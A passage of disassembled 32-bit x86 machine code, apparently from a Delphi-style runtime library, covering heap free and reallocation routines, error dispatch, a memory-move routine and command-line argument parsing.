  402369:	68 b4 b5 40 00       	push   $0x40b5b4
  40236e:	e8 f1 ed ff ff       	call   0x401164
  402373:	c3                   	ret
  402374:	e9 4b 0e 00 00       	jmp    0x4031c4
  402379:	eb e5                	jmp    0x402360
  40237b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40237e:	5b                   	pop    %ebx
  40237f:	8b e5                	mov    %ebp,%esp
  402381:	5d                   	pop    %ebp
  402382:	c3                   	ret
  402383:	90                   	nop
  402384:	55                   	push   %ebp
  402385:	8b ec                	mov    %esp,%ebp
  402387:	83 c4 f0             	add    $0xfffffff0,%esp
  40238a:	53                   	push   %ebx
  40238b:	8b d8                	mov    %eax,%ebx
  40238d:	33 c0                	xor    %eax,%eax
  40238f:	a3 b0 b5 40 00       	mov    %eax,0x40b5b0
  402394:	80 3d ac b5 40 00 00 	cmpb   $0x0,0x40b5ac
  40239b:	75 1f                	jne    0x4023bc
  40239d:	e8 da f5 ff ff       	call   0x40197c
  4023a2:	84 c0                	test   %al,%al
  4023a4:	75 16                	jne    0x4023bc
  4023a6:	c7 05 b0 b5 40 00 08 	movl   $0x8,0x40b5b0
  4023ad:	00 00 00 
  4023b0:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  4023b7:	e9 96 01 00 00       	jmp    0x402552
  4023bc:	33 d2                	xor    %edx,%edx
  4023be:	55                   	push   %ebp
  4023bf:	68 4b 25 40 00       	push   $0x40254b
  4023c4:	64 ff 32             	push   %fs:(%edx)
  4023c7:	64 89 22             	mov    %esp,%fs:(%edx)
  4023ca:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  4023d1:	74 0a                	je     0x4023dd
  4023d3:	68 b4 b5 40 00       	push   $0x40b5b4
  4023d8:	e8 7f ed ff ff       	call   0x40115c
  4023dd:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4023e0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4023e3:	83 e8 04             	sub    $0x4,%eax
  4023e6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4023e9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4023ec:	8b 18                	mov    (%eax),%ebx
  4023ee:	f6 c3 02             	test   $0x2,%bl
  4023f1:	75 0f                	jne    0x402402
  4023f3:	c7 05 b0 b5 40 00 09 	movl   $0x9,0x40b5b0
  4023fa:	00 00 00 
  4023fd:	e9 20 01 00 00       	jmp    0x402522
  402402:	ff 0d 9c b5 40 00    	decl   0x40b59c
  402408:	8b c3                	mov    %ebx,%eax
  40240a:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40240f:	83 e8 04             	sub    $0x4,%eax
  402412:	29 05 a0 b5 40 00    	sub    %eax,0x40b5a0
  402418:	f6 c3 01             	test   $0x1,%bl
  40241b:	74 53                	je     0x402470
  40241d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402420:	83 e8 0c             	sub    $0xc,%eax
  402423:	8b 40 08             	mov    0x8(%eax),%eax
  402426:	83 f8 0c             	cmp    $0xc,%eax
  402429:	7c 07                	jl     0x402432
  40242b:	a9 03 00 00 80       	test   $0x80000003,%eax
  402430:	74 0f                	je     0x402441
  402432:	c7 05 b0 b5 40 00 0a 	movl   $0xa,0x40b5b0
  402439:	00 00 00 
  40243c:	e9 e1 00 00 00       	jmp    0x402522
  402441:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402444:	2b d0                	sub    %eax,%edx
  402446:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402449:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40244c:	3b 42 08             	cmp    0x8(%edx),%eax
  40244f:	74 0f                	je     0x402460
  402451:	c7 05 b0 b5 40 00 0a 	movl   $0xa,0x40b5b0
  402458:	00 00 00 
  40245b:	e9 c2 00 00 00       	jmp    0x402522
  402460:	03 d8                	add    %eax,%ebx
  402462:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402465:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402468:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40246b:	e8 e4 f6 ff ff       	call   0x401b54
  402470:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  402476:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402479:	03 c3                	add    %ebx,%eax
  40247b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40247e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402481:	3b 05 08 b6 40 00    	cmp    0x40b608,%eax
  402487:	75 2c                	jne    0x4024b5
  402489:	29 1d 08 b6 40 00    	sub    %ebx,0x40b608
  40248f:	01 1d 04 b6 40 00    	add    %ebx,0x40b604
  402495:	81 3d 04 b6 40 00 00 	cmpl   $0x3c00,0x40b604
  40249c:	3c 00 00 
  40249f:	7e 05                	jle    0x4024a6
  4024a1:	e8 7a fa ff ff       	call   0x401f20
  4024a6:	33 c0                	xor    %eax,%eax
  4024a8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024ab:	e8 d0 0d 00 00       	call   0x403280
  4024b0:	e9 9d 00 00 00       	jmp    0x402552
  4024b5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024b8:	8b 00                	mov    (%eax),%eax
  4024ba:	a8 02                	test   $0x2,%al
  4024bc:	74 1e                	je     0x4024dc
  4024be:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4024c3:	83 f8 04             	cmp    $0x4,%eax
  4024c6:	7d 0c                	jge    0x4024d4
  4024c8:	c7 05 b0 b5 40 00 0b 	movl   $0xb,0x40b5b0
  4024cf:	00 00 00 
  4024d2:	eb 4e                	jmp    0x402522
  4024d4:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024d7:	83 08 01             	orl    $0x1,(%eax)
  4024da:	eb 3c                	jmp    0x402518
  4024dc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024e2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024e5:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  4024e9:	74 11                	je     0x4024fc
  4024eb:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024ee:	83 38 00             	cmpl   $0x0,(%eax)
  4024f1:	74 09                	je     0x4024fc
  4024f3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024f6:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  4024fa:	7d 0c                	jge    0x402508
  4024fc:	c7 05 b0 b5 40 00 0b 	movl   $0xb,0x40b5b0
  402503:	00 00 00 
  402506:	eb 1a                	jmp    0x402522
  402508:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40250b:	8b 40 08             	mov    0x8(%eax),%eax
  40250e:	03 d8                	add    %eax,%ebx
  402510:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402513:	e8 3c f6 ff ff       	call   0x401b54
  402518:	8b d3                	mov    %ebx,%edx
  40251a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40251d:	e8 06 f9 ff ff       	call   0x401e28
  402522:	a1 b0 b5 40 00       	mov    0x40b5b0,%eax
  402527:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40252a:	33 c0                	xor    %eax,%eax
  40252c:	5a                   	pop    %edx
  40252d:	59                   	pop    %ecx
  40252e:	59                   	pop    %ecx
  40252f:	64 89 10             	mov    %edx,%fs:(%eax)
  402532:	68 52 25 40 00       	push   $0x402552
  402537:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  40253e:	74 0a                	je     0x40254a
  402540:	68 b4 b5 40 00       	push   $0x40b5b4
  402545:	e8 1a ec ff ff       	call   0x401164
  40254a:	c3                   	ret
  40254b:	e9 74 0c 00 00       	jmp    0x4031c4
  402550:	eb e5                	jmp    0x402537
  402552:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402555:	5b                   	pop    %ebx
  402556:	8b e5                	mov    %ebp,%esp
  402558:	5d                   	pop    %ebp
  402559:	c3                   	ret
  40255a:	8b c0                	mov    %eax,%eax
  40255c:	53                   	push   %ebx
  40255d:	56                   	push   %esi
  40255e:	57                   	push   %edi
  40255f:	55                   	push   %ebp
  402560:	83 c4 f4             	add    $0xfffffff4,%esp
  402563:	8b da                	mov    %edx,%ebx
  402565:	83 c3 07             	add    $0x7,%ebx
  402568:	83 e3 fc             	and    $0xfffffffc,%ebx
  40256b:	83 fb 0c             	cmp    $0xc,%ebx
  40256e:	7d 05                	jge    0x402575
  402570:	bb 0c 00 00 00       	mov    $0xc,%ebx
  402575:	83 e8 04             	sub    $0x4,%eax
  402578:	89 04 24             	mov    %eax,(%esp)
  40257b:	8b 04 24             	mov    (%esp),%eax
  40257e:	8b 30                	mov    (%eax),%esi
  402580:	81 e6 fc ff ff 7f    	and    $0x7ffffffc,%esi
  402586:	8b 04 24             	mov    (%esp),%eax
  402589:	03 c6                	add    %esi,%eax
  40258b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40258f:	3b f3                	cmp    %ebx,%esi
  402591:	75 07                	jne    0x40259a
  402593:	b0 01                	mov    $0x1,%al
  402595:	e9 bd 01 00 00       	jmp    0x402757
  40259a:	3b f3                	cmp    %ebx,%esi
  40259c:	0f 8e 90 00 00 00    	jle    0x402632
  4025a2:	8b ee                	mov    %esi,%ebp
  4025a4:	2b eb                	sub    %ebx,%ebp
  4025a6:	8b 54 24 04          	mov    0x4(%esp),%edx
  4025aa:	3b 15 08 b6 40 00    	cmp    0x40b608,%edx
  4025b0:	75 2c                	jne    0x4025de
  4025b2:	29 2d 08 b6 40 00    	sub    %ebp,0x40b608
  4025b8:	01 2d 04 b6 40 00    	add    %ebp,0x40b604
  4025be:	83 3d 04 b6 40 00 0c 	cmpl   $0xc,0x40b604
  4025c5:	0f 8d 6f 01 00 00    	jge    0x40273a
  4025cb:	01 2d 08 b6 40 00    	add    %ebp,0x40b608
  4025d1:	29 2d 04 b6 40 00    	sub    %ebp,0x40b604
  4025d7:	8b de                	mov    %esi,%ebx
  4025d9:	e9 5c 01 00 00       	jmp    0x40273a
  4025de:	89 44 24 04          	mov    %eax,0x4(%esp)
  4025e2:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025e6:	f6 00 02             	testb  $0x2,(%eax)
  4025e9:	75 18                	jne    0x402603
  4025eb:	8b 44 24 04          	mov    0x4(%esp),%eax
  4025ef:	89 44 24 08          	mov    %eax,0x8(%esp)
  4025f3:	8b 44 24 08          	mov    0x8(%esp),%eax
  4025f7:	03 68 08             	add    0x8(%eax),%ebp
  4025fa:	8b 44 24 08          	mov    0x8(%esp),%eax
  4025fe:	e8 51 f5 ff ff       	call   0x401b54
  402603:	83 fd 0c             	cmp    $0xc,%ebp
  402606:	7c 23                	jl     0x40262b
  402608:	8b 04 24             	mov    (%esp),%eax
  40260b:	03 c3                	add    %ebx,%eax
  40260d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402611:	83 cd 02             	or     $0x2,%ebp
  402614:	8b 44 24 04          	mov    0x4(%esp),%eax
  402618:	89 28                	mov    %ebp,(%eax)
  40261a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40261e:	83 c0 04             	add    $0x4,%eax
  402621:	e8 42 f6 ff ff       	call   0x401c68
  402626:	e9 0f 01 00 00       	jmp    0x40273a
  40262b:	8b de                	mov    %esi,%ebx
  40262d:	e9 08 01 00 00       	jmp    0x40273a
  402632:	8b fb                	mov    %ebx,%edi
  402634:	2b fe                	sub    %esi,%edi
  402636:	8b 44 24 04          	mov    0x4(%esp),%eax
  40263a:	3b 05 08 b6 40 00    	cmp    0x40b608,%eax
  402640:	75 65                	jne    0x4026a7
  402642:	3b 3d 04 b6 40 00    	cmp    0x40b604,%edi
  402648:	7f 4f                	jg     0x402699
  40264a:	29 3d 04 b6 40 00    	sub    %edi,0x40b604
  402650:	01 3d 08 b6 40 00    	add    %edi,0x40b608
  402656:	83 3d 04 b6 40 00 0c 	cmpl   $0xc,0x40b604
  40265d:	7d 18                	jge    0x402677
  40265f:	a1 04 b6 40 00       	mov    0x40b604,%eax
  402664:	01 05 08 b6 40 00    	add    %eax,0x40b608
  40266a:	03 1d 04 b6 40 00    	add    0x40b604,%ebx
  402670:	33 c0                	xor    %eax,%eax
  402672:	a3 04 b6 40 00       	mov    %eax,0x40b604
  402677:	8b c3                	mov    %ebx,%eax
  402679:	2b c6                	sub    %esi,%eax
  40267b:	01 05 a0 b5 40 00    	add    %eax,0x40b5a0
  402681:	8b 04 24             	mov    (%esp),%eax
  402684:	8b 00                	mov    (%eax),%eax
  402686:	25 03 00 00 80       	and    $0x80000003,%eax
  40268b:	0b d8                	or     %eax,%ebx
  40268d:	8b 04 24             	mov    (%esp),%eax
  402690:	89 18                	mov    %ebx,(%eax)
  402692:	b0 01                	mov    $0x1,%al
  402694:	e9 be 00 00 00       	jmp    0x402757
  402699:	e8 82 f8 ff ff       	call   0x401f20
  40269e:	8b 04 24             	mov    (%esp),%eax
  4026a1:	03 c6                	add    %esi,%eax
  4026a3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026a7:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026ab:	f6 00 02             	testb  $0x2,(%eax)
  4026ae:	75 4f                	jne    0x4026ff
  4026b0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026b4:	89 44 24 08          	mov    %eax,0x8(%esp)
  4026b8:	8b 54 24 08          	mov    0x8(%esp),%edx
  4026bc:	8b 6a 08             	mov    0x8(%edx),%ebp
  4026bf:	3b fd                	cmp    %ebp,%edi
  4026c1:	7e 0a                	jle    0x4026cd
  4026c3:	03 c5                	add    %ebp,%eax
  4026c5:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026c9:	2b fd                	sub    %ebp,%edi
  4026cb:	eb 32                	jmp    0x4026ff
  4026cd:	8b 44 24 08          	mov    0x8(%esp),%eax
  4026d1:	e8 7e f4 ff ff       	call   0x401b54
  4026d6:	2b ef                	sub    %edi,%ebp
  4026d8:	83 fd 0c             	cmp    $0xc,%ebp
  4026db:	7c 0e                	jl     0x4026eb
  4026dd:	8b 04 24             	mov    (%esp),%eax
  4026e0:	03 c3                	add    %ebx,%eax
  4026e2:	8b d5                	mov    %ebp,%edx
  4026e4:	e8 3f f7 ff ff       	call   0x401e28
  4026e9:	eb 4f                	jmp    0x40273a
  4026eb:	03 dd                	add    %ebp,%ebx
  4026ed:	8b 04 24             	mov    (%esp),%eax
  4026f0:	03 c3                	add    %ebx,%eax
  4026f2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4026f6:	8b 44 24 04          	mov    0x4(%esp),%eax
  4026fa:	83 20 fe             	andl   $0xfffffffe,(%eax)
  4026fd:	eb 3b                	jmp    0x40273a
  4026ff:	8b 44 24 04          	mov    0x4(%esp),%eax
  402703:	8b 00                	mov    (%eax),%eax
  402705:	a9 00 00 00 80       	test   $0x80000000,%eax
  40270a:	74 2a                	je     0x402736
  40270c:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  402711:	03 44 24 04          	add    0x4(%esp),%eax
  402715:	89 44 24 04          	mov    %eax,0x4(%esp)
  402719:	8b d7                	mov    %edi,%edx
  40271b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40271f:	e8 00 f9 ff ff       	call   0x402024
  402724:	84 c0                	test   %al,%al
  402726:	74 0e                	je     0x402736
  402728:	8b 04 24             	mov    (%esp),%eax
  40272b:	03 c6                	add    %esi,%eax
  40272d:	89 44 24 04          	mov    %eax,0x4(%esp)
  402731:	e9 fc fe ff ff       	jmp    0x402632
  402736:	33 c0                	xor    %eax,%eax
  402738:	eb 1d                	jmp    0x402757
  40273a:	8b c3                	mov    %ebx,%eax
  40273c:	2b c6                	sub    %esi,%eax
  40273e:	01 05 a0 b5 40 00    	add    %eax,0x40b5a0
  402744:	8b 04 24             	mov    (%esp),%eax
  402747:	8b 00                	mov    (%eax),%eax
  402749:	25 03 00 00 80       	and    $0x80000003,%eax
  40274e:	0b d8                	or     %eax,%ebx
  402750:	8b 04 24             	mov    (%esp),%eax
  402753:	89 18                	mov    %ebx,(%eax)
  402755:	b0 01                	mov    $0x1,%al
  402757:	83 c4 0c             	add    $0xc,%esp
  40275a:	5d                   	pop    %ebp
  40275b:	5f                   	pop    %edi
  40275c:	5e                   	pop    %esi
  40275d:	5b                   	pop    %ebx
  40275e:	c3                   	ret
  40275f:	90                   	nop
  402760:	55                   	push   %ebp
  402761:	8b ec                	mov    %esp,%ebp
  402763:	83 c4 f8             	add    $0xfffffff8,%esp
  402766:	53                   	push   %ebx
  402767:	56                   	push   %esi
  402768:	8b f2                	mov    %edx,%esi
  40276a:	8b d8                	mov    %eax,%ebx
  40276c:	80 3d ac b5 40 00 00 	cmpb   $0x0,0x40b5ac
  402773:	75 13                	jne    0x402788
  402775:	e8 02 f2 ff ff       	call   0x40197c
  40277a:	84 c0                	test   %al,%al
  40277c:	75 0a                	jne    0x402788
  40277e:	33 c0                	xor    %eax,%eax
  402780:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402783:	e9 98 00 00 00       	jmp    0x402820
  402788:	33 d2                	xor    %edx,%edx
  40278a:	55                   	push   %ebp
  40278b:	68 19 28 40 00       	push   $0x402819
  402790:	64 ff 32             	push   %fs:(%edx)
  402793:	64 89 22             	mov    %esp,%fs:(%edx)
  402796:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  40279d:	74 0a                	je     0x4027a9
  40279f:	68 b4 b5 40 00       	push   $0x40b5b4
  4027a4:	e8 b3 e9 ff ff       	call   0x40115c
  4027a9:	8b d6                	mov    %esi,%edx
  4027ab:	8b c3                	mov    %ebx,%eax
  4027ad:	e8 aa fd ff ff       	call   0x40255c
  4027b2:	84 c0                	test   %al,%al
  4027b4:	74 05                	je     0x4027bb
  4027b6:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4027b9:	eb 3d                	jmp    0x4027f8
  4027bb:	8b c6                	mov    %esi,%eax
  4027bd:	e8 16 fa ff ff       	call   0x4021d8
  4027c2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4027c5:	8b c3                	mov    %ebx,%eax
  4027c7:	83 e8 04             	sub    $0x4,%eax
  4027ca:	8b 00                	mov    (%eax),%eax
  4027cc:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  4027d1:	83 e8 04             	sub    $0x4,%eax
  4027d4:	3b f0                	cmp    %eax,%esi
  4027d6:	7d 02                	jge    0x4027da
  4027d8:	8b c6                	mov    %esi,%eax
  4027da:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4027de:	74 12                	je     0x4027f2
  4027e0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4027e3:	8b cb                	mov    %ebx,%ecx
  4027e5:	91                   	xchg   %eax,%ecx
  4027e6:	e8 55 01 00 00       	call   0x402940
  4027eb:	8b c3                	mov    %ebx,%eax
  4027ed:	e8 92 fb ff ff       	call   0x402384
  4027f2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4027f5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4027f8:	33 c0                	xor    %eax,%eax
  4027fa:	5a                   	pop    %edx
  4027fb:	59                   	pop    %ecx
  4027fc:	59                   	pop    %ecx
  4027fd:	64 89 10             	mov    %edx,%fs:(%eax)
  402800:	68 20 28 40 00       	push   $0x402820
  402805:	80 3d 35 b0 40 00 00 	cmpb   $0x0,0x40b035
  40280c:	74 0a                	je     0x402818
  40280e:	68 b4 b5 40 00       	push   $0x40b5b4
  402813:	e8 4c e9 ff ff       	call   0x401164
  402818:	c3                   	ret
  402819:	e9 a6 09 00 00       	jmp    0x4031c4
  40281e:	eb e5                	jmp    0x402805
  402820:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402823:	5e                   	pop    %esi
  402824:	5b                   	pop    %ebx
  402825:	59                   	pop    %ecx
  402826:	59                   	pop    %ecx
  402827:	5d                   	pop    %ebp
  402828:	c3                   	ret
  402829:	8d 40 00             	lea    0x0(%eax),%eax
  40282c:	53                   	push   %ebx
  40282d:	51                   	push   %ecx
  40282e:	8b d8                	mov    %eax,%ebx
  402830:	85 db                	test   %ebx,%ebx
  402832:	7e 1a                	jle    0x40284e
  402834:	8b c3                	mov    %ebx,%eax
  402836:	ff 15 30 a0 40 00    	call   *0x40a030
  40283c:	89 04 24             	mov    %eax,(%esp)
  40283f:	83 3c 24 00          	cmpl   $0x0,(%esp)
  402843:	75 0e                	jne    0x402853
  402845:	b0 01                	mov    $0x1,%al
  402847:	e8 d8 00 00 00       	call   0x402924
  40284c:	eb 05                	jmp    0x402853
  40284e:	33 c0                	xor    %eax,%eax
  402850:	89 04 24             	mov    %eax,(%esp)
  402853:	8b 04 24             	mov    (%esp),%eax
  402856:	5a                   	pop    %edx
  402857:	5b                   	pop    %ebx
  402858:	c3                   	ret
  402859:	8d 40 00             	lea    0x0(%eax),%eax
  40285c:	53                   	push   %ebx
  40285d:	85 c0                	test   %eax,%eax
  40285f:	74 15                	je     0x402876
  402861:	ff 15 34 a0 40 00    	call   *0x40a034
  402867:	8b d8                	mov    %eax,%ebx
  402869:	85 db                	test   %ebx,%ebx
  40286b:	74 0b                	je     0x402878
  40286d:	b0 02                	mov    $0x2,%al
  40286f:	e8 b0 00 00 00       	call   0x402924
  402874:	eb 02                	jmp    0x402878
  402876:	33 db                	xor    %ebx,%ebx
  402878:	8b c3                	mov    %ebx,%eax
  40287a:	5b                   	pop    %ebx
  40287b:	c3                   	ret
  40287c:	8b 08                	mov    (%eax),%ecx
  40287e:	85 c9                	test   %ecx,%ecx
  402880:	74 32                	je     0x4028b4
  402882:	85 d2                	test   %edx,%edx
  402884:	74 18                	je     0x40289e
  402886:	50                   	push   %eax
  402887:	89 c8                	mov    %ecx,%eax
  402889:	ff 15 38 a0 40 00    	call   *0x40a038
  40288f:	59                   	pop    %ecx
  402890:	09 c0                	or     %eax,%eax
  402892:	74 19                	je     0x4028ad
  402894:	89 01                	mov    %eax,(%ecx)
  402896:	c3                   	ret
  402897:	b0 02                	mov    $0x2,%al
  402899:	e9 86 00 00 00       	jmp    0x402924
  40289e:	89 10                	mov    %edx,(%eax)
  4028a0:	89 c8                	mov    %ecx,%eax
  4028a2:	ff 15 34 a0 40 00    	call   *0x40a034
  4028a8:	09 c0                	or     %eax,%eax
  4028aa:	75 eb                	jne    0x402897
  4028ac:	c3                   	ret
  4028ad:	b0 01                	mov    $0x1,%al
  4028af:	e9 70 00 00 00       	jmp    0x402924
  4028b4:	85 d2                	test   %edx,%edx
  4028b6:	74 10                	je     0x4028c8
  4028b8:	50                   	push   %eax
  4028b9:	89 d0                	mov    %edx,%eax
  4028bb:	ff 15 30 a0 40 00    	call   *0x40a030
  4028c1:	59                   	pop    %ecx
  4028c2:	09 c0                	or     %eax,%eax
  4028c4:	74 e7                	je     0x4028ad
  4028c6:	89 01                	mov    %eax,(%ecx)
  4028c8:	c3                   	ret
  4028c9:	8d 40 00             	lea    0x0(%eax),%eax
  4028cc:	89 15 04 a0 40 00    	mov    %edx,0x40a004
  4028d2:	e8 61 0e 00 00       	call   0x403738
  4028d7:	c3                   	ret
  4028d8:	53                   	push   %ebx
  4028d9:	56                   	push   %esi
  4028da:	8b f2                	mov    %edx,%esi
  4028dc:	8b d8                	mov    %eax,%ebx
  4028de:	80 e3 7f             	and    $0x7f,%bl
  4028e1:	83 3d 08 b0 40 00 00 	cmpl   $0x0,0x40b008
  4028e8:	74 0a                	je     0x4028f4
  4028ea:	8b d6                	mov    %esi,%edx
  4028ec:	8b c3                	mov    %ebx,%eax
  4028ee:	ff 15 08 b0 40 00    	call   *0x40b008
  4028f4:	84 db                	test   %bl,%bl
  4028f6:	75 0d                	jne    0x402905
  4028f8:	e8 0b 21 00 00       	call   0x404a08
  4028fd:	8b 98 04 00 00 00    	mov    0x4(%eax),%ebx
  402903:	eb 0f                	jmp    0x402914
  402905:	80 fb 18             	cmp    $0x18,%bl
  402908:	77 0a                	ja     0x402914
  40290a:	33 c0                	xor    %eax,%eax
  40290c:	8a c3                	mov    %bl,%al
  40290e:	8a 98 3c a0 40 00    	mov    0x40a03c(%eax),%bl
  402914:	33 c0                	xor    %eax,%eax
  402916:	8a c3                	mov    %bl,%al
  402918:	8b d6                	mov    %esi,%edx
  40291a:	e8 ad ff ff ff       	call   0x4028cc
  40291f:	5e                   	pop    %esi
  402920:	5b                   	pop    %ebx
  402921:	c3                   	ret
  402922:	8b c0                	mov    %eax,%eax
  402924:	83 e0 7f             	and    $0x7f,%eax
  402927:	8b 14 24             	mov    (%esp),%edx
  40292a:	e9 a9 ff ff ff       	jmp    0x4028d8
  40292f:	c3                   	ret
  402930:	53                   	push   %ebx
  402931:	8b d8                	mov    %eax,%ebx
  402933:	e8 d0 20 00 00       	call   0x404a08
  402938:	89 98 04 00 00 00    	mov    %ebx,0x4(%eax)
  40293e:	5b                   	pop    %ebx
  40293f:	c3                   	ret
  402940:	56                   	push   %esi
  402941:	57                   	push   %edi
  402942:	89 c6                	mov    %eax,%esi
  402944:	89 d7                	mov    %edx,%edi
  402946:	89 c8                	mov    %ecx,%eax
  402948:	39 f7                	cmp    %esi,%edi
  40294a:	77 13                	ja     0x40295f
  40294c:	74 2f                	je     0x40297d
  40294e:	c1 f9 02             	sar    $0x2,%ecx
  402951:	78 2a                	js     0x40297d
  402953:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  402955:	89 c1                	mov    %eax,%ecx
  402957:	83 e1 03             	and    $0x3,%ecx
  40295a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40295c:	5f                   	pop    %edi
  40295d:	5e                   	pop    %esi
  40295e:	c3                   	ret
  40295f:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  402963:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  402967:	c1 f9 02             	sar    $0x2,%ecx
  40296a:	78 11                	js     0x40297d
  40296c:	fd                   	std
  40296d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40296f:	89 c1                	mov    %eax,%ecx
  402971:	83 e1 03             	and    $0x3,%ecx
  402974:	83 c6 03             	add    $0x3,%esi
  402977:	83 c7 03             	add    $0x3,%edi
  40297a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40297c:	fc                   	cld
  40297d:	5f                   	pop    %edi
  40297e:	5e                   	pop    %esi
  40297f:	c3                   	ret
  402980:	53                   	push   %ebx
  402981:	56                   	push   %esi
  402982:	57                   	push   %edi
  402983:	55                   	push   %ebp
  402984:	83 c4 e8             	add    $0xffffffe8,%esp
  402987:	89 54 24 04          	mov    %edx,0x4(%esp)
  40298b:	89 04 24             	mov    %eax,(%esp)
  40298e:	8b f4                	mov    %esp,%esi
  402990:	8d 7c 24 14          	lea    0x14(%esp),%edi
  402994:	eb 0a                	jmp    0x4029a0
  402996:	8b 06                	mov    (%esi),%eax
  402998:	50                   	push   %eax
  402999:	e8 ea e6 ff ff       	call   0x401088
  40299e:	89 06                	mov    %eax,(%esi)
  4029a0:	8b 06                	mov    (%esi),%eax
  4029a2:	8a 18                	mov    (%eax),%bl
  4029a4:	84 db                	test   %bl,%bl
  4029a6:	74 05                	je     0x4029ad
  4029a8:	80 fb 20             	cmp    $0x20,%bl
  4029ab:	76 e9                	jbe    0x402996
  4029ad:	8b 06                	mov    (%esi),%eax
  4029af:	80 38 22             	cmpb   $0x22,(%eax)
  4029b2:	75 0d                	jne    0x4029c1
  4029b4:	8b 06                	mov    (%esi),%eax
  4029b6:	80 78 01 22          	cmpb   $0x22,0x1(%eax)
  4029ba:	75 05                	jne    0x4029c1
  4029bc:	83 06 02             	addl   $0x2,(%esi)
  4029bf:	eb df                	jmp    0x4029a0
  4029c1:	33 ed                	xor    %ebp,%ebp
  4029c3:	8b 06                	mov    (%esi),%eax
  4029c5:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4029c9:	eb 5b                	jmp    0x402a26
  4029cb:	8b 06                	mov    (%esi),%eax
  4029cd:	80 38 22             	cmpb   $0x22,(%eax)
  4029d0:	75 40                	jne    0x402a12
  4029d2:	8b 06                	mov    (%esi),%eax
  4029d4:	50                   	push   %eax
  4029d5:	e8 ae e6 ff ff       	call   0x401088
  4029da:	89 06                	mov    %eax,(%esi)
  4029dc:	eb 14                	jmp    0x4029f2
  4029de:	8b 06                	mov    (%esi),%eax
  4029e0:	50                   	push   %eax
  4029e1:	e8 a2 e6 ff ff       	call   0x401088
  4029e6:	89 07                	mov    %eax,(%edi)
  4029e8:	8b 07                	mov    (%edi),%eax
  4029ea:	2b 06                	sub    (%esi),%eax
  4029ec:	03 e8                	add    %eax,%ebp
  4029ee:	8b 07                	mov    (%edi),%eax
  4029f0:	89 06                	mov    %eax,(%esi)
  4029f2:	8b 06                	mov    (%esi),%eax
  4029f4:	8a 18                	mov    (%eax),%bl
  4029f6:	84 db                	test   %bl,%bl
  4029f8:	74 05                	je     0x4029ff
  4029fa:	80 fb 22             	cmp    $0x22,%bl
  4029fd:	75 df                	jne    0x4029de
  4029ff:	8b 06                	mov    (%esi),%eax
  402a01:	80 38 00             	cmpb   $0x0,(%eax)
  402a04:	74 20                	je     0x402a26
  402a06:	8b 06                	mov    (%esi),%eax
  402a08:	50                   	push   %eax
  402a09:	e8 7a e6 ff ff       	call   0x401088
  402a0e:	89 06                	mov    %eax,(%esi)
  402a10:	eb 14                	jmp    0x402a26
  402a12:	8b 06                	mov    (%esi),%eax
  402a14:	50                   	push   %eax
  402a15:	e8 6e e6 ff ff       	call   0x401088
  402a1a:	89 07                	mov    %eax,(%edi)
  402a1c:	8b 07                	mov    (%edi),%eax
  402a1e:	2b 06                	sub    (%esi),%eax
  402a20:	03 e8                	add    %eax,%ebp
  402a22:	8b 07                	mov    (%edi),%eax
